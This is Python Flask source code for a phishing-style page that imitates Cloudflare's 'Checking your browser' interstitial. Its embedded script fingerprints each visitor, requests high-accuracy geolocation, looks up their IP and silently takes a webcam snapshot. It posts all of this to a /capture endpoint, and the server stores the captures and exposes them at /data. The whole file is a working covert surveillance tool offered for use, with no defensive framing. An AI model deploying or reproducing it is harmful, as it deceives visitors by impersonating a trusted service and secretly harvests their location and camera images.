import os
import json
import time
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

CAPTURED_DATA = []

CLOUDFLARE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Checking your browser</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            background: #f6f6f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f38020;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .rayid {
            font-family: monospace;
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size: 48px; margin-bottom: 20px;">🛡️</div>
        <h1>Checking your browser</h1>
        <p>Checking your browser before accessing the website.</p>
        
        <div class="spinner"></div>
        
        <div class="info">
            <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
            <p style="margin-top: 10px;">
                <strong>Ray ID:</strong> <span class="rayid">{{ray_id}}</span>
            </p>
            <p style="margin-top: 5px;">DDoS protection by Cloudflare</p>
        </div>
    </div>

    <script>
        setTimeout(function() {
            startCheck();
        }, 3000);

        function startCheck() {
            const data = {
                ua: navigator.userAgent,
                screen: { w: screen.width, h: screen.height },
                lang: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                cookies: navigator.cookieEnabled,
                java: navigator.javaEnabled(),
                pdf: navigator.pdfViewerEnabled,
                hardware: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.loc = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        };
                        sendData(data);
                    },
                    () => sendData(data),
                    { enableHighAccuracy: true, timeout: 3000 }
                );
            } else {
                sendData(data);
            }

            function sendData(d) {
                fetch('https://ipinfo.io/json').then(r => r.json()).then(ip => {
                    d.ip = ip;
                    
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(stream => {
                                const v = document.createElement('video');
                                const c = document.createElement('canvas');
                                const ctx = c.getContext('2d');
                                
                                v.srcObject = stream;
                                v.play();
                                
                                setTimeout(() => {
                                    c.width = v.videoWidth;
                                    c.height = v.videoHeight;
                                    ctx.drawImage(v, 0, 0);
                                    d.cam = c.toDataURL('image/jpeg', 0.7);
                                    
                                    stream.getTracks().forEach(t => t.stop());
                                    finalSend(d);
                                }, 1500);
                            })
                            .catch(() => finalSend(d));
                    } else {
                        finalSend(d);
                    }
                }).catch(() => finalSend(d));
            }

            function finalSend(d) {
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(d)
                }).then(() => {
                    window.location.href = "https://www.cloudflare.com";
                });
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    import random
    import string
    ray_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    return render_template_string(CLOUDFLARE_HTML, ray_id=ray_id)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    CAPTURED_DATA.append({
        'timestamp': time.time(),
        'data': data
    })
    print(f"[+] Captured from: {data.get('ip', {}).get('ip', 'Unknown')}")
    return {'status': 'ok'}

@app.route('/data')
def show_data():
    return {'captured': CAPTURED_DATA}

@app.route('/clear')
def clear_data():
    CAPTURED_DATA.clear()
    return {'status': 'cleared'}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
